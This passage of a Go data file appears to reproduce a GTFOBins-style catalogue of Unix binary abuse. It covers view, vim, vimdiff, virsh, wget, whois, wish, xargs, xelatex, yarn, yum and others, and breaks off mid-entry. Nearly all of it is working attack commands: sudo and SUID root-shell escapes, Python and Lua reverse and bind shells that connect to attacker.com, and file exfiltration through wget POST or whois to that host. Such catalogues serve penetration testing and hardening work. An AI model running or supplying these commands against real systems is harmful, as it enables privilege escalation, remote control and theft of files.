			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. This requires that 'view' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
view -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
`, "code"},
		},
		"file-download": []Functions{
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
`, "code"},
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file. This requires that 'view' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`view file_to_read`, "code"},
		},
		"library-load": []Functions{
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'`, "code"},
		},
		"suid": []Functions{
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3. Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`export RHOST=attacker.com
export RPORT=12345
view -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
`, "code"},
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell. This requires that 'view' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
		},
		"file-write": []Functions{
			Functions{`view file_to_write
iDATA
^[
w!
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo view -c ':!/bin/sh'`, "code"},
			Functions{`sudo view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`sudo view -c ':lua os.execute("reset; exec sh")'`, "code"},
			Functions{`This requires that 'view' is compiled with Lua support.`, "description"},
		},
		"capabilities": []Functions{
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`This requires that 'view' is compiled with Lua support.`, "description"},
			Functions{`./view -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`view -c ':!/bin/sh'`, "code"},
			Functions{`view
:set shell=/bin/sh
:shell
`, "code"},
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'view' is compiled with Lua support.`, "description"},
			Functions{`view -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This requires that 'view' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
view -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
`, "code"},
		},
	},
	"vigr": map[string][]Functions{
		"suid": []Functions{
			Functions{`./vigr`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo vigr`, "code"},
		},
	},
	"vim": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo vim -c ':!/bin/sh'`, "code"},
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'vim' is compiled with Lua support.`, "description"},
			Functions{`sudo vim -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`vim -c ':!/bin/sh'`, "code"},
			Functions{`vim
:set shell=/bin/sh
:shell
`, "code"},
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'vim' is compiled with Lua support.`, "description"},
			Functions{`vim -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3. Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`vim file_to_read`, "code"},
		},
		"file-download": []Functions{
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
`, "code"},
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file. This requires that 'vim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
vim -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`vim file_to_write
iDATA
^[
w
`, "code"},
		},
		"library-load": []Functions{
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'`, "code"},
		},
		"suid": []Functions{
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`This requires that 'vim' is compiled with Lua support.`, "description"},
			Functions{`./vim -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell. This requires that 'vim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`export LPORT=12345
vim -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
`, "code"},
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This requires that 'vim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
		},
		"file-upload": []Functions{
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
`, "code"},
			Functions{`This requires that 'vim' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. This requires that 'vim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
`, "code"},
		},
	},
	"vimdiff": map[string][]Functions{
		"non-interactive-reverse-shell": []Functions{
			Functions{`export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
`, "code"},
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell. This requires that 'vimdiff' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This requires that 'vimdiff' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
vimdiff -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`vimdiff file_to_write
iDATA
^[
w
`, "code"},
		},
		"suid": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo vimdiff -c ':!/bin/sh'`, "code"},
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`sudo vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'vimdiff' is compiled with Lua support.`, "description"},
			Functions{`sudo vimdiff -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`vimdiff -c ':!/bin/sh'`, "code"},
			Functions{`vimdiff
:set shell=/bin/sh
:shell
`, "code"},
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'vimdiff' is compiled with Lua support.`, "description"},
			Functions{`vimdiff -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3. Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`vimdiff file_to_read`, "code"},
		},
		"library-load": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Lua support.`, "description"},
			Functions{`./vimdiff -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"file-upload": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
`, "code"},
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. This requires that 'vimdiff' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vimdiff -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
`, "code"},
		},
		"file-download": []Functions{
			Functions{`This requires that 'vimdiff' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
`, "code"},
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file. This requires that 'vimdiff' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
vimdiff -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
`, "code"},
		},
	},
	"vipw": map[string][]Functions{
		"suid": []Functions{
			Functions{`./vipw`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo vipw`, "code"},
		},
	},
	"virsh": map[string][]Functions{
		"sudo": []Functions{
			Functions{`SCRIPT=script_to_run
TF=$(mktemp)
cat > $TF << EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='$SCRIPT'/>
    </interface>
  </devices>
</domain>
EOF
sudo virsh -c qemu:///system create $TF
virsh -c qemu:///system destroy x
`, "code"},
		},
		"file-write": []Functions{
			Functions{`This requires the user to be in the 'libvirt' group to perform privileged file write. If the target directory doesn't exist, 'pool-create-as' must be run with the '--build' option. The destination file ownership and permissions can be set in the XML.`, "description"},
			Functions{`LFILE_DIR=/root
LFILE_NAME=file_to_write

echo 'data' > data_to_write

TF=$(mktemp)
cat > $TF <<EOF
<volume type='file'>
  <name>y</name>
  <key>$LFILE_DIR/$LFILE_NAME</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>$LFILE_DIR/$LFILE_NAME</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-create --pool x --file $TF
virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
virsh -c qemu:///system pool-destroy x
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This requires the user to be in the 'libvirt' group to perform privileged file read.`, "description"},
			Functions{`LFILE_DIR=/root
LFILE_NAME=file_to_read

SPATH=file_to_save

virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
virsh -c qemu:///system pool-destroy x
`, "code"},
		},
	},
	"watch": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`./watch 'reset; exec sh 1>&0 2>&0'`, "code"},
		},
		"shell": []Functions{
			Functions{`watch -x sh -c 'reset; exec sh 1>&0 2>&0'`, "code"},
		},
		"suid": []Functions{
			Functions{`This keeps the SUID privileges only if the '-x' option is present.`, "description"},
			Functions{`./watch -x sh -c 'reset; exec sh 1>&0 2>&0'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'`, "code"},
		},
	},
	"wc": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
wc --files0-from "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./wc --files0-from "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo wc --files0-from "$LFILE"
`, "code"},
		},
	},
	"wget": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
`, "code"},
			Functions{`Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use '--post-data' to send hard-coded data.`, "description"},
		},
		"file-read": []Functions{
			Functions{`The file to be read is treated as a list of URLs, one per line, which are actually fetched by 'wget'. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.`, "description"},
			Functions{`LFILE=file_to_read
wget -i $LFILE
`, "code"},
		},
		"file-write": []Functions{
			Functions{`The data to be written is treated as a list of URLs, one per line, which are actually fetched by 'wget'. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.`, "description"},
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
wget -i $TF -o $LFILE
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
wget $URL -O $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
./wget $URL -O $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo wget $URL -O $LFILE
`, "code"},
		},
	},
	"whiptail": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
whiptail --textbox --scrolltext "$LFILE" 0 0
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./whiptail --textbox --scrolltext "$LFILE" 0 0
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo whiptail --textbox --scrolltext "$LFILE" 0 0
`, "code"},
		},
	},
	"whois": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`Send a text file to a TCP port. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. The file has a trailing '$'\x0d\x0a'' and its length is limited by the maximum size of arguments.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT "'cat $LFILE'"
`, "code"},
			Functions{`Send a binary file to a TCP port. Run 'nc -l -p 12345 | tr -d $'\x0d' | base64 -d > "file_to_save"' on the attacker box to collect the file. The file length is limited by the maximum size of arguments.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT "'base64 $LFILE'"
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch remote text file from a remote TCP port. Run 'nc -l -p 12345 < "file_to_send"' on the attacker box to send the file. The file has instances of '$'\x0d'' stripped.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > "$LFILE"
`, "code"},
			Functions{`Fetch remote binary file from a remote TCP port. Run 'base64 "file_to_send" | nc -l -p 12345' on the attacker box to send the file.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
`, "code"},
		},
	},
	"wish": map[string][]Functions{
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo wish
exec /bin/sh <@stdin >@stdout 2>@stderr
`, "code"},
		},
		"shell": []Functions{
			Functions{`wish
exec /bin/sh <@stdin >@stdout 2>@stderr
`, "code"},
		},
	},
	"xargs": map[string][]Functions{
		"sudo": []Functions{
			Functions{`GNU version only.`, "description"},
			Functions{`sudo xargs -a /dev/null sh`, "code"},
		},
		"shell": []Functions{
			Functions{`GNU version only.`, "description"},
			Functions{`xargs -a /dev/null sh`, "code"},
			Functions{`echo x | xargs -Iy sh -c 'exec sh 0<&1'`, "code"},
			Functions{`Read interactively from 'stdin'.`, "description"},
			Functions{`xargs -Ix sh -c 'exec sh 0<&1'
x^D^D
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This works as long as the file does not contain the NUL character, also a trailing '$'\n'' is added. The actual '/bin/echo' command is executed. GNU version only.`, "description"},
			Functions{`LFILE=file_to_read
xargs -a "$LFILE" -0
`, "code"},
		},
		"suid": []Functions{
			Functions{`./xargs -a /dev/null sh -p`, "code"},
			Functions{`GNU version only.`, "description"},
		},
	},
	"xelatex": map[string][]Functions{
		"shell": []Functions{
			Functions{`xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file will be part of the output.`, "description"},
			Functions{`xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The read file will be part of the output.`, "description"},
			Functions{`sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
`, "code"},
			Functions{`sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
	},
	"xetex": map[string][]Functions{
		"shell": []Functions{
			Functions{`xetex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo xetex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./xetex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
	},
	"xmodmap": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
xmodmap -v $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./xmodmap -v $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo xmodmap -v $LFILE
`, "code"},
		},
	},
	"xmore": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
xmore $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./xmore $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo xmore $LFILE
`, "code"},
		},
	},
	"xxd": map[string][]Functions{
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo xxd "$LFILE" | xxd -r
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
echo DATA | xxd | xxd -r - "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
xxd "$LFILE" | xxd -r
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./xxd "$LFILE" | xxd -r
`, "code"},
		},
	},
	"xz": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
xz -c "$LFILE" | xz -d
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./xz -c "$LFILE" | xz -d
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo xz -c "$LFILE" | xz -d
`, "code"},
		},
	},
	"yarn": map[string][]Functions{
		"shell": []Functions{
			Functions{`yarn exec /bin/sh`, "code"},
			Functions{`Additionally, arbitrary script names can be used in place of 'preinstall' and triggered by name with, e.g., 'yarn --cwd $TF run preinstall'.`, "description"},
			Functions{`TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
yarn --cwd $TF install
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo yarn exec /bin/sh`, "code"},
		},
	},
	"yelp": map[string][]Functions{
		"file-read": []Functions{
			Functions{`This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.`, "description"},
			Functions{`LFILE=file_to_read
yelp "man:$LFILE"
`, "code"},
		},
	},
	"yum": map[string][]Functions{
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of '.rpm', the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in '/var/tmp', for example '/var/tmp/yum-root-cR0O4h/'.`, "description"},
			Functions{`RHOST=attacker.com
RFILE=file_to_get.rpm
yum install http://$RHOST/$RFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
'''
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
'''
`, "description"},
			Functions{`sudo yum localinstall -y x-1.0-1.noarch.rpm
`, "code"},
			Functions{`Spawn interactive root shell by loading a custom plugin.
`, "description"},
			Functions{`TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

